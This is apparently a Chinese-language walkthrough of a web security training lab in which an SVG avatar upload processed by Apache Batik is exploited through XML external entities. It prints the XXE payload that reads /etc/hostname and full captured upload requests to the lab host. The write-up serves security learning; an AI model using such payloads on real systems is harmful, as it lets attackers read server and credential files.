教學
https://www.ttcas.org/zh-Hant/article/1wv1s_255ez.html
https://zhuanlan.zhihu.com/p/323315064











```

This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.

To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname.
Hint

The SVG image format uses XML.



該實驗室允許用戶將頭像附加到評論中，並使用 Apache Batik 庫來處理頭像圖像文件。

為解決實驗室問題，上傳一張圖片，顯示處理後的 /etc/hostname 文件的內容。 然後使用“提交解決方案”按鈕提交服務器主機名的值。

暗示
SVG 圖像格式使用 XML。






```



官方payload:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ 
<!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>

<svg width="128px" height="128px"
	xmlns="http://www.w3.org/2000/svg"
	xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
	<text font-size="16" x="0" y="16">&xxe;</text>
</svg>


```

這個xml payload 就是 去請求
```
file:///etc/hostname
```
抓取到的內容會被tag text 裡面 





我們先不攻擊修該一下存成 .svg，看是不是一張圖片。

```

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ 
<!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="500px" height="1000px"
	xmlns="http://www.w3.org/2000/svg"
	xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
	<text font-size="60" x="100" y="100">123123123</text>
</svg>


```


的確是一張圖。


在修該一下刪除 svg 其它xmlns 屬性 ，存成 .svg 圖片檔

```

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ 
<!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="500px" height="1000px">
	<text font-size="60" x="100" y="100">123123123</text>
</svg>


```



實測不用這些 也可以被處理成圖片，但是在上傳後，後端會出現錯誤，所以最好加上去
```
http://www.w3.org/2000/svg 
http://www.w3.org/1999/xlink
```




我找了網上另一個資源。

test.svg
```xml

<svg version="1.1"
  baseProfile="full"
  width="300" height="200"
  xmlns="http://www.w3.org/2000/svg">

  <rect width="100%" height="100%" stroke="red" stroke-width="4" fill="yellow" />

  <circle cx="150" cy="100" r="80" fill="green" />

  <text x="150" y="115" font-size="16" text-anchor="middle" fill="white">RUNOOB SVG TEST</text>

</svg>



```

實測也是需要，不能刪除。

```
xmlns="http://www.w3.org/2000/svg"
```



研究一下目標



post command 按鈕
需要填
comment 
name
email
圖片其實要放，不過我在filename=""
亂填了一個複檔名。也可以成功post
```
filename="123.png"
```



```


POST /post/comment HTTP/1.1
Host: 0a24003404fa795cc1c0cdc900270086.web-security-academy.net
Cookie: session=640j9YDHhN0iujmr99jSGhprFrqSCqNd
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------351230099420054412264241557090
Content-Length: 943
Origin: https://0a24003404fa795cc1c0cdc900270086.web-security-academy.net
Referer: https://0a24003404fa795cc1c0cdc900270086.web-security-academy.net/post?postId=2
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------351230099420054412264241557090
Content-Disposition: form-data; name="csrf"

PXKL164kcqoKoPrEqQz6Em2k9izYBB31
-----------------------------351230099420054412264241557090
Content-Disposition: form-data; name="postId"

2
-----------------------------351230099420054412264241557090
Content-Disposition: form-data; name="comment"

111
-----------------------------351230099420054412264241557090
Content-Disposition: form-data; name="name"

222
-----------------------------351230099420054412264241557090
Content-Disposition: form-data; name="avatar"; filename=""
Content-Type: application/octet-stream


-----------------------------351230099420054412264241557090
Content-Disposition: form-data; name="email"

333@333
-----------------------------351230099420054412264241557090
Content-Disposition: form-data; name="website"


-----------------------------351230099420054412264241557090--




```


成功會跳轉到畫面

```
# Thank you for your comment!

Your comment has been submitted.

```

返回就可以看到自己的評論了。

也就是說它不會檢測圖片，你只需要複檔名改成圖片格式，它就通過了，它其實有文件上傳漏洞。




好吧我們正常上傳一個svg圖片 看看格式長啥樣。

```http


POST /post/comment HTTP/1.1
Host: 0a24003404fa795cc1c0cdc900270086.web-security-academy.net
Cookie: session=640j9YDHhN0iujmr99jSGhprFrqSCqNd
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------24022411809284857813804630655
Content-Length: 1326
Origin: https://0a24003404fa795cc1c0cdc900270086.web-security-academy.net
Referer: https://0a24003404fa795cc1c0cdc900270086.web-security-academy.net/post?postId=4
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------24022411809284857813804630655
Content-Disposition: form-data; name="csrf"

PXKL164kcqoKoPrEqQz6Em2k9izYBB31
-----------------------------24022411809284857813804630655
Content-Disposition: form-data; name="postId"

4
-----------------------------24022411809284857813804630655
Content-Disposition: form-data; name="comment"

1111111111111
-----------------------------24022411809284857813804630655
Content-Disposition: form-data; name="name"

11111111111111111
-----------------------------24022411809284857813804630655
Content-Disposition: form-data; name="avatar"; filename="test_svg.svg"
Content-Type: image/svg+xml

<svg version="1.1"
  baseProfile="full"
  width="300" height="200"
  xmlns="http://www.w3.org/2000/svg">

  <rect width="100%" height="100%" stroke="red" stroke-width="4" fill="yellow" />

  <circle cx="150" cy="100" r="80" fill="green" />

  <text x="150" y="115" font-size="16" text-anchor="middle" fill="white">RUNOOB SVG TEST</text>

</svg>

-----------------------------24022411809284857813804630655
Content-Disposition: form-data; name="email"

11111111111111@1
-----------------------------24022411809284857813804630655
Content-Disposition: form-data; name="website"


-----------------------------24022411809284857813804630655--


```



知道這是正常的後，BP 換一下payload就可以了。

成功送出後，可以看到大頭貼有一串數字。

放大圖片。
看到
38591ec01022



提交，成功



















